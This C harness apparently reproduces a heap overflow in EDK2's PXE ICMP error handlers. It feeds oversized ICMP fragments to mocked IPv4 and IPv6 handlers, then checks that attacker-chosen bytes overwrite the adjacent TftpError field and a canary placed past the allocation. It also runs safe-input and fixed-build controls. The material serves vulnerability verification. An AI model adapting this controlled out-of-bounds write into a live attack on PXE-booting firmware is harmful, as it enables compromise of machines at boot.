/* Driver for verbatim EDK2 PxeBcIcmp*ErrorDpcHandle handlers.
 * usage: harness <v4|v6> <attack|safe> <canary|heapexact>
 *   canary    - heap-allocate PXEBC_PRIVATE_DATA followed by a canary
 *   heapexact - heap-allocate exactly sizeof(PXEBC_PRIVATE_DATA) (ASan redzone)
 * EXPECT=unchanged selects the fixed-build control.
 */
#include "standin.h"
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>

#define FRAG_LEN 200
#define NFRAG 3
#define SAFE_FRAG_LEN 100
#define CANARY_LEN 256
#define CANARY_WRITE_INDEX 84  /* write_off(636) -> canary start(720) */

static EFI_BOOT_SERVICES gBs;
EFI_BOOT_SERVICES *gBS = &gBs;
static int signal_calls;

static EFI_STATUS EFIAPI mock_signal (EFI_EVENT Event) { (void)Event; signal_calls++; return EFI_SUCCESS; }
static EFI_STATUS EFIAPI mock_recv4 (EFI_IP4_PROTOCOL *This, VOID *Token) { (void)This; (void)Token; return EFI_SUCCESS; }
static EFI_STATUS EFIAPI mock_recv6 (EFI_IP6_PROTOCOL *This, VOID *Token) { (void)This; (void)Token; return EFI_SUCCESS; }

static void die (const char *what) { fprintf (stderr, "FAIL setup: %s\n", what); exit (2); }

int main (int argc, char **argv) {
  const char *family = (argc > 1) ? argv[1] : "v4";
  const char *kind   = (argc > 2) ? argv[2] : "attack";
  const char *alloc  = (argc > 3) ? argv[3] : "canary";
  const char *expect = getenv ("EXPECT");
  int is_v6 = (family[0] == 'v' && family[1] == '6');
  int attack = (kind[0] == 'a');
  int unchanged = expect && expect[0] == 'u';
  int fraglen = attack ? FRAG_LEN : SAFE_FRAG_LEN;
  EFI_PXE_BASE_CODE_MODE *Mode;
  UINT8 *Canary;
  PXEBC_PRIVATE_DATA *Priv;
  EFI_IP4_PROTOCOL Ip4;
  EFI_IP6_PROTOCOL Ip6;
  EFI_IP4_HEADER H4;
  EFI_IP6_HEADER H6;
  EFI_IP4_RECEIVE_DATA *Rx4 = NULL;
  EFI_IP6_RECEIVE_DATA *Rx6 = NULL;
  UINT8 *Frag[NFRAG];
  int i, rc = 0;
  size_t icmp_sz = sizeof (EFI_PXE_BASE_CODE_ICMP_ERROR);
  size_t mode_sz = sizeof (EFI_PXE_BASE_CODE_MODE);
  size_t priv_sz = sizeof (PXEBC_PRIVATE_DATA);
  size_t icmp_off = offsetof (EFI_PXE_BASE_CODE_MODE, IcmpError);
  size_t tftp_off = offsetof (EFI_PXE_BASE_CODE_MODE, TftpError);
  size_t write_off = icmp_off + (size_t)NFRAG * (size_t)fraglen;
  size_t probe_off = icmp_off + (size_t)NFRAG * (size_t)FRAG_LEN;
  size_t d = probe_off - tftp_off;
  static const UINT8 chosen[4] = { 0x48, 0x5a, 0x4d, 0x49 };
  static const UINT8 canary_chosen[4] = { 0x54, 0x41, 0x55, 0x46 };
  static const UINT8 a5[4] = { 0xa5, 0xa5, 0xa5, 0xa5 };

  memset (&Ip4, 0, sizeof (Ip4));
  memset (&Ip6, 0, sizeof (Ip6));
  memset (&H4, 0, sizeof (H4));
  memset (&H6, 0, sizeof (H6));
  gBs.SignalEvent = mock_signal;
  Ip4.Receive = mock_recv4;
  Ip6.Receive = mock_recv6;
  H4.Protocol = EFI_IP_PROTO_ICMP;
  H6.NextHeader = IP6_ICMP;

  if (alloc[0] == 'h') {
    Priv = (PXEBC_PRIVATE_DATA *)malloc (priv_sz);
    Canary = NULL;
  } else {
    Priv = (PXEBC_PRIVATE_DATA *)calloc (1, priv_sz + CANARY_LEN);
    if (!Priv) die ("calloc private");
    Canary = (UINT8 *)Priv + priv_sz;
    memset (Canary, 0x5a, CANARY_LEN);
  }
  if (!Priv) die ("malloc private");
  memset (Priv, 0, priv_sz);
  Mode = &Priv->Mode;
  memset (Mode, 0, mode_sz);
  memset (&Mode->TftpError, 0xa5, sizeof (Mode->TftpError));
  Mode->UsingIpv6 = (BOOLEAN)is_v6;
  Mode->SubnetMask.Addr[0] = 0;
  Priv->Ip4 = &Ip4;
  Priv->Ip6 = &Ip6;

  for (i = 0; i < NFRAG; i++) {
    Frag[i] = (UINT8 *)malloc ((size_t)FRAG_LEN);
    if (!Frag[i]) die ("malloc fragment");
    memset (Frag[i], 0x11 + i, FRAG_LEN);
  }
  Frag[0][0] = (UINT8)(is_v6 ? ICMP_V6_DEST_UNREACHABLE : ICMP_DEST_UNREACHABLE);
  memcpy (Frag[2], chosen, sizeof (chosen));
  memcpy (Frag[2] + CANARY_WRITE_INDEX, canary_chosen, sizeof (canary_chosen));

  if (is_v6) {
    size_t sz = sizeof (EFI_IP6_RECEIVE_DATA) + (NFRAG - 1) * sizeof (EFI_IP6_FRAGMENT_DATA);
    Rx6 = (EFI_IP6_RECEIVE_DATA *)calloc (1, sz);
    if (!Rx6) die ("calloc rx6");
    Rx6->Header = &H6;
    Rx6->FragmentCount = (UINT32)NFRAG;
    for (i = 0; i < NFRAG; i++) {
      Rx6->FragmentTable[i].FragmentBuffer = Frag[i];
      Rx6->FragmentTable[i].FragmentLength = (UINT32)fraglen;
    }
    Priv->Icmp6Token.Status = EFI_ICMP_ERROR;
    Priv->Icmp6Token.Packet.RxData = Rx6;
  } else {
    size_t sz = sizeof (EFI_IP4_RECEIVE_DATA) + (NFRAG - 1) * sizeof (EFI_IP4_FRAGMENT_DATA);
    Rx4 = (EFI_IP4_RECEIVE_DATA *)calloc (1, sz);
    if (!Rx4) die ("calloc rx4");
    Rx4->Header = &H4;
    Rx4->FragmentCount = (UINT32)NFRAG;
    for (i = 0; i < NFRAG; i++) {
      Rx4->FragmentTable[i].FragmentBuffer = Frag[i];
      Rx4->FragmentTable[i].FragmentLength = (UINT32)fraglen;
    }
    Priv->IcmpToken.Status = EFI_ICMP_ERROR;
    Priv->IcmpToken.Packet.RxData = Rx4;
  }

  printf ("FAMILY=%s KIND=%s ALLOC=%s EXPECT=%s\n", family, kind, alloc, expect ? expect : "-");
  printf ("sizeof_icmperror=%zu sizeof_mode=%zu sizeof_priv=%zu icmp_off=%zu tftp_off=%zu\n",
          icmp_sz, mode_sz, priv_sz, icmp_off, tftp_off);
  printf ("write_start_from_priv=%zu write_start_from_tftp=%zu past_priv_end=%zd\n",
          write_off, d, (ssize_t)write_off + (ssize_t)((attack ? 3U * FRAG_LEN : 3U * SAFE_FRAG_LEN) - icmp_sz) - (ssize_t)priv_sz);

  if (is_v6) PxeBcIcmp6ErrorDpcHandle (Priv);
  else PxeBcIcmpErrorDpcHandle (Priv);

  printf ("signal_calls=%d token_status=%u\n", signal_calls,
          (unsigned)(is_v6 ? Priv->Icmp6Token.Status : Priv->IcmpToken.Status));

  if (Canary) {
    const UINT8 *tftp = (const UINT8 *)&Mode->TftpError;
    printf ("tftp_offset=%zu bytes=%02x %02x %02x %02x\n", d, tftp[d], tftp[d+1], tftp[d+2], tftp[d+3]);
    printf ("canary_offset=0 bytes=%02x %02x %02x %02x\n", Canary[0], Canary[1], Canary[2], Canary[3]);
    if (unchanged) {
      if (memcmp (tftp + d, a5, 4) != 0) { printf ("FAIL fixed build modified TftpError\n"); rc = 1; }
      else if (memcmp (Canary, canary_chosen, 4) == 0) { printf ("FAIL fixed build modified canary\n"); rc = 1; }
      else printf ("FIXED_CONTROL_CLEAN=1\n");
    } else if (attack) {
      if (memcmp (tftp + d, chosen, 4) != 0) { printf ("FAIL chosen bytes not in adjacent TftpError\n"); rc = 1; }
      else if (memcmp (Canary, canary_chosen, 4) != 0) { printf ("FAIL chosen bytes not in canary\n"); rc = 1; }
      else printf ("CHOSEN_BYTES_MATCH=1\n");
    } else {
      if (memcmp (tftp + d, a5, 4) != 0) { printf ("FAIL safe input modified TftpError\n"); rc = 1; }
      else if (memcmp (Canary, canary_chosen, 4) == 0) { printf ("FAIL safe input modified canary\n"); rc = 1; }
      else printf ("SAFE_CONTROL_CLEAN=1\n");
    }
  }
  printf ("RESULT=%s\n", rc ? "FAIL" : "OK");
  return rc;
}
